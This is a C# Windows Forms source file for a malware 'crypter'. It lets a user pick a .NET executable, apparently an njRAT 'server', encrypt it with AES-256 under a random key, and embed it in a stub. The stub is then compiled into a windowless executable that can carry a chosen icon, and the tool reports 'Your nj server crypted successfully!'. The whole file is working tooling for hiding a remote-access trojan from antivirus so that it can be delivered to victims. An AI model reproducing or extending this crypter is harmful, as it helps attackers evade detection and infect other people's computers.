using System;
using System.IO;
using Microsoft.CSharp;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.Collections.Generic;
namespace GUI
{
    public partial class fMain : Form
    {
        public fMain()
        {
            InitializeComponent();
        }

        private void bSelectFile_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog fOpenDialog = new OpenFileDialog())
            {
                fOpenDialog.Filter = "Executable (*.exe)|*.exe";
                fOpenDialog.Title = "Select .NET File to crypt...";

                if(fOpenDialog.ShowDialog() == DialogResult.OK)
                {
                    tServer.Text = fOpenDialog.FileName;
                }
            }
        }

        private void bSelectIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog fOpenDialog = new OpenFileDialog())
            {
                fOpenDialog.Filter = "Icon (*.ico)|*.ico";
                fOpenDialog.Title = "Select Icon...";

                if (fOpenDialog.ShowDialog() == DialogResult.OK)
                {
                    tIcon.Text = fOpenDialog.FileName;
                }
            }
        }

        private void bCrypt_Click(object sender, EventArgs e)
        {
            if (!File.Exists(tServer.Text))
            {
                MessageBox.Show("Error, server is not exists!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (!File.Exists(tIcon.Text) && tIcon.Text.Trim() != "")
            {
                MessageBox.Show("Error, icon is not exists!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }


            using (SaveFileDialog fSaveDialog = new SaveFileDialog())
            {

                fSaveDialog.Filter = "Executable (*.exe)|*.exe";
                fSaveDialog.Title = "Save crypted Server...";

                if (fSaveDialog.ShowDialog() == DialogResult.OK)
                {

                    string sFileName = cUtils.GenStr(8);
                    string sKey = cUtils.GenStr(40);

                    string sStub = Properties.Resources.Stub

                        .Replace("%RES_NAME%", sFileName)
                        .Replace("%ENC_KEY%", sKey);

                    File.WriteAllBytes(sFileName, nAES256.cAES256.Encrypt(File.ReadAllBytes(tServer.Text), System.Text.Encoding.Default.GetBytes(sKey)));


                    using (CSharpCodeProvider csCodeProvider = new CSharpCodeProvider(new Dictionary<string, string>
            {
                {"CompilerVersion", "v2.0"}
            }))
                    {
                        CompilerParameters cpParams = new CompilerParameters(null, fSaveDialog.FileName, true);


                        if (tIcon.Text.Trim() == "")
                            cpParams.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug-";
                        else
                            cpParams.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug- /win32icon:\"" + tIcon.Text + "\"";

                        cpParams.ReferencedAssemblies.Add("System.dll");
                        cpParams.ReferencedAssemblies.Add("System.Management.dll");
                        cpParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");

                        cpParams.EmbeddedResources.Add(sFileName);

                        csCodeProvider.CompileAssemblyFromSource(cpParams, sStub);

                        MessageBox.Show("Your nj server crypted successfully!", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }

                    File.Delete(sFileName);
                }

            }
        }
    }
}
